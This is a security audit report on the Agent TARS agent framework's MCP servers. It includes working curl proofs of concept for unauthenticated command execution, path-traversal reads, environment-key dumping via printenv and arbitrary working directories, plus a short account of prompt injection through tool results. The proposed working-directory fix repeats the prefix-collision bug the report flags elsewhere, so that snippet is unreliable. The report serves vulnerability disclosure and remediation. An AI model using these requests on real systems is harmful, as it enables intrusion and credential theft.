# Agent TARS Security Audit Report

**Audit Date:** 2026-05-11  
**Audited Commit:** 7986f5aea500c4535c0e55dc5c5d0cda73767c45  
**Auditor:** AutoFyn Security Audit  
**Result:** 5 Critical Vulnerabilities Confirmed Against Live Instance

---

## Executive Summary

Agent TARS is a multimodal AI agent framework that provides MCP (Model Context Protocol) servers for command execution, filesystem access, and browser automation. This security audit identified **5 critical vulnerabilities** that were confirmed against live instances.

The most severe finding is that MCP servers expose powerful capabilities (arbitrary command execution, filesystem access) over HTTP with **zero authentication**. Any network client that can reach these endpoints has full access to the underlying system.

**Key Findings:**
1. **Unauthenticated Remote Code Execution** - MCP commands server allows any client to execute arbitrary OS commands
2. **Path Traversal via Prefix Collision** - Filesystem server's path validation can be bypassed to read/write files outside allowed directories
3. **Environment Variable Leakage** - Spawned processes inherit parent environment including potential API keys
4. **Missing Authentication** - HTTP endpoints have no authentication middleware
5. **Arbitrary Working Directory** - Commands can be executed from any directory on the system

---

## Vulnerability Details

### VULN-01: Remote Code Execution via Unauthenticated MCP Commands Server

**Severity:** CRITICAL  
**CWE:** CWE-78 (OS Command Injection), CWE-306 (Missing Authentication)  
**CVSS:** 10.0 (Network exploitable, no auth required, full system compromise)

**Affected Component:**  
`packages/agent-infra/mcp-servers/commands/src/server.ts:143`

**Description:**  
The `run_command` tool passes user-supplied command strings directly to Node.js `exec()` which invokes `/bin/sh -c <command>`. There is no input sanitization, no command allowlist, and no authentication. When the server is started with `--port`, any network client can execute arbitrary OS commands.

**Proof of Concept:**
```bash
curl -X POST http://localhost:8089/mcp \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/event-stream' \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "run_command",
      "arguments": {
        "command": "echo VULN_MARKER_$(whoami)_$(id -u)"
      }
    },
    "id": 1
  }'
```

**Evidence:** Response contains `VULN_MARKER_agentuser_1000` proving arbitrary command execution.

**Impact:** Full system compromise. Attacker can:
- Execute any command with server process privileges
- Read/write any file accessible to the process
- Establish reverse shells
- Pivot to internal network
- Exfiltrate data

**Remediation:**
1. Add authentication middleware (bearer token, mTLS)
2. Implement command allowlist
3. Use `execFile()` with argument arrays instead of `exec()` with shell strings
4. Restrict network binding (localhost only by default)

---

### VULN-02: Path Traversal via Prefix Collision Bypass

**Severity:** CRITICAL  
**CWE:** CWE-22 (Path Traversal)  
**CVSS:** 8.6 (Network exploitable, read/write files outside sandbox)

**Affected Component:**  
`packages/agent-infra/mcp-servers/filesystem/src/server.ts:75-77`

**Description:**  
The `validatePath()` function checks if a requested path is within allowed directories using `normalizedRequested.startsWith(dir)`. However, `path.normalize()` does not append trailing slashes, so `/tmp/workspace-evil` passes the check for allowed directory `/tmp/workspace` because the string starts with the allowed prefix.

**Vulnerable Code:**
```typescript
// server.ts:74-77
const isAllowed = allowedDirectories.some((dir) =>
  normalizedRequested.startsWith(dir),  // BUG: no separator check
);
```

**Proof of Concept:**
```bash
# Server configured with --allowed-directories /tmp/workspace
# Attack reads sibling directory /tmp/workspace-evil/secret.txt

curl -X POST http://localhost:8090/mcp \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/event-stream' \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "read_file",
      "arguments": {
        "path": "/tmp/workspace-evil/secret.txt"
      }
    },
    "id": 1
  }'
```

**Evidence:** Response contains `SECRET_DATA_12345` from file outside allowed directory.

**Impact:**
- Read any file in sibling directories with matching name prefix
- Write/overwrite files in sibling directories
- Potential credential theft, configuration tampering

**Remediation:**
```typescript
// Fix: Add trailing separator before comparison
const isAllowed = allowedDirectories.some((dir) =>
  normalizedRequested === dir || normalizedRequested.startsWith(dir + path.sep)
);
```

---

### VULN-03: Environment Variable Leakage via Child Process Inheritance

**Severity:** HIGH  
**CWE:** CWE-200 (Information Exposure)  
**CVSS:** 7.5 (Credential theft, API key exposure)

**Affected Component:**  
`packages/agent-infra/mcp-servers/commands/src/server.ts:143`  
`packages/agent-infra/mcp-servers/commands/src/exec-utils.ts:44`

**Description:**  
The `exec()` and `execAsync()` calls do not specify an `env` option, causing child processes to inherit the full parent process environment. This includes any API keys, tokens, or credentials present in the MCP server's environment.

**Proof of Concept:**
```bash
curl -X POST http://localhost:8089/mcp \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/event-stream' \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "run_command",
      "arguments": {
        "command": "printenv"
      }
    },
    "id": 1
  }'
```

**Evidence:** Response contains environment variables including `PATH`, `HOME`, `NODE_PATH`, and any API keys set in the server environment.

**Impact:**
- Theft of API keys (OPENAI_API_KEY, ANTHROPIC_API_KEY, etc.)
- Credential exposure
- Service account token theft

**Remediation:**
```typescript
// Explicitly set minimal environment
const safeEnv = {
  PATH: '/usr/bin:/bin',
  HOME: '/tmp',
  LANG: 'en_US.UTF-8'
};
exec(command, { env: safeEnv, ...options });
```

---

### VULN-04: Missing Authentication on MCP HTTP Endpoints

**Severity:** CRITICAL  
**CWE:** CWE-306 (Missing Authentication for Critical Function)  
**CVSS:** 9.8 (Unauthenticated access to all server functionality)

**Affected Component:**  
`packages/agent-infra/mcp-http-server/src/startServer.ts:115-117`  
`packages/agent-infra/mcp-servers/commands/src/index.ts`  
`packages/agent-infra/mcp-servers/filesystem/src/index.ts`

**Description:**  
When MCP servers are started with `--port`, they expose all tools over HTTP with no authentication. The `startSseAndStreamableHttpMcpServer()` function accepts a `middlewares` array, but neither the commands nor filesystem server implementations pass any authentication middleware.

**Proof of Concept:**
```bash
# List all available tools without any authentication
curl -X POST http://localhost:8089/mcp \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/event-stream' \
  -d '{"jsonrpc":"2.0","method":"tools/list","params":{},"id":1}'

# Execute tool without any authentication
curl -X POST http://localhost:8090/mcp \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/event-stream' \
  -d '{
    "jsonrpc":"2.0",
    "method":"tools/call",
    "params":{"name":"list_allowed_directories","arguments":{}},
    "id":1
  }'
```

**Evidence:** Both calls succeed without any authentication headers.

**Impact:**
- Any network client can execute all MCP tools
- Complete bypass of intended access controls
- Remote system compromise

**Remediation:**
1. Implement bearer token authentication middleware
2. Add CORS restrictions
3. Bind to localhost by default
4. Require explicit `--allow-remote` flag for network binding

---

### VULN-05: Arbitrary Working Directory (CWD) Path Traversal

**Severity:** HIGH  
**CWE:** CWE-22 (Path Traversal)  
**CVSS:** 7.5 (Execute commands from any directory)

**Affected Component:**  
`packages/agent-infra/mcp-servers/commands/src/server.ts:137-140`

**Description:**  
The `cwd` parameter in `run_command` accepts any absolute path without restriction. An attacker can execute commands from sensitive directories like `/etc`, `/root/.ssh`, or application directories.

**Proof of Concept:**
```bash
curl -X POST http://localhost:8089/mcp \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/event-stream' \
  -d '{
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
      "name": "run_command",
      "arguments": {
        "command": "pwd && ls -la",
        "cwd": "/etc"
      }
    },
    "id": 1
  }'
```

**Evidence:** Response shows `/etc` as working directory with directory listing.

**Impact:**
- Access to files via relative paths from any directory
- Read sensitive files (SSH keys, configs, credentials)
- Write to arbitrary locations if process has permission

**Remediation:**
```typescript
// Validate cwd against allowed directory list
const allowedCwds = ['/tmp', '/home/user/workspace'];
if (!allowedCwds.some(dir => cwd.startsWith(dir))) {
  throw new Error('CWD outside allowed directories');
}
```

---

## Additional Findings (From Code Analysis)

These vulnerabilities were identified during code review but not exploited in this audit round:

### Browser Operator - Security Flags Disabled

**Severity:** CRITICAL  
**File:** `packages/agent-infra/browser/src/local-browser.ts:47-61`

Chrome is launched with dangerous flags:
- `--no-sandbox` - Disables OS-level sandboxing
- `--disable-web-security` - Disables CORS/SOP
- `--disable-features=IsolateOrigins,site-per-process` - Disables site isolation

These flags enable:
- Renderer compromise → full OS code execution
- Cross-origin data theft
- SSRF to internal services

### Browser Operator - SSRF via Navigate Action

**Severity:** HIGH  
**File:** `packages/ui-tars/operators/browser-operator/src/browser-operator.ts:556-568`

URL validation only checks for `http://` or `https://` prefix. No blocklist for internal addresses:
- `http://169.254.169.254/` (AWS IMDS)
- `http://127.0.0.1:9222/` (CDP)
- `http://localhost:6379/` (Redis)

### Agent Server - No Rate Limiting

**Severity:** HIGH  
**File:** `multimodal/tarko/agent-server-next/src/middlewares/`

No rate limiting exists at any layer. Enables:
- API cost exhaustion attacks
- Denial of service
- Resource exhaustion

### Prompt Injection via Tool Results

**Severity:** HIGH  
**File:** `multimodal/tarko/agent/src/agent/runner/tool-processor.ts:306-337`

Tool results flow directly into LLM prompts without sanitization. If a tool fetches external content containing `<tool_call>` tags, the prompt engineering parser may execute attacker-controlled tool calls.

---

## Reproduction Steps

### Prerequisites
- Node.js >= 20.x
- pnpm 9.10.0 (via npx)
- Access to repository at commit 7986f5aea500c4535c0e55dc5c5d0cda73767c45

### Setup
```bash
cd /home/agentuser/repo/autofyn_audit
./setup.sh
```

### Run All Exploits
```bash
./run_all_exploits.sh
```

### Expected Output
```
=== Summary: 5/5 exploits confirmed ===
[PASS] exploit_01_command_injection.sh - RCE via unauthenticated MCP commands endpoint
[PASS] exploit_02_path_traversal.sh - Path prefix collision bypass (filesystem server)
[PASS] exploit_03_env_leakage.sh - Environment variable leakage via command execution
[PASS] exploit_04_unauth_access.sh - No authentication on MCP endpoints
[PASS] exploit_05_cwd_traversal.sh - Arbitrary cwd parameter - path traversal
```

### Cleanup
```bash
./teardown.sh
```

---

## Recommendations

### Immediate (P0)
1. **Add authentication to all HTTP MCP endpoints** - Implement bearer token or mTLS authentication
2. **Fix path prefix collision** - Use `startsWith(dir + path.sep)` or `path.relative()` check
3. **Remove dangerous browser flags** - Enable sandbox, web security, site isolation

### Short-term (P1)
1. **Implement command allowlist** - Only permit explicitly allowed commands
2. **Add rate limiting** - Prevent API cost exhaustion
3. **Sanitize tool results** - Escape XML-like tags before LLM injection

### Medium-term (P2)
1. **Environment scrubbing** - Don't inherit sensitive env vars to child processes
2. **CWD restrictions** - Limit working directories to allowed paths
3. **URL validation** - Blocklist internal addresses in browser navigation

---

## Files in This Audit

```
autofyn_audit/
├── audit_report.md          # This report
├── setup.sh                  # Environment setup (builds servers, starts them)
├── teardown.sh               # Cleanup script
├── run_all_exploits.sh       # Master exploit runner
├── exploit_01_command_injection.sh   # RCE via run_command
├── exploit_02_path_traversal.sh      # Path prefix collision
├── exploit_03_env_leakage.sh         # Environment variable exposure
├── exploit_04_unauth_access.sh       # Missing authentication
└── exploit_05_cwd_traversal.sh       # Arbitrary cwd
```

---

## Disclaimer

This audit was conducted for security research purposes. All vulnerabilities were tested against a controlled local instance. The findings should be addressed before deploying Agent TARS in any environment where untrusted clients may have network access to MCP server endpoints.
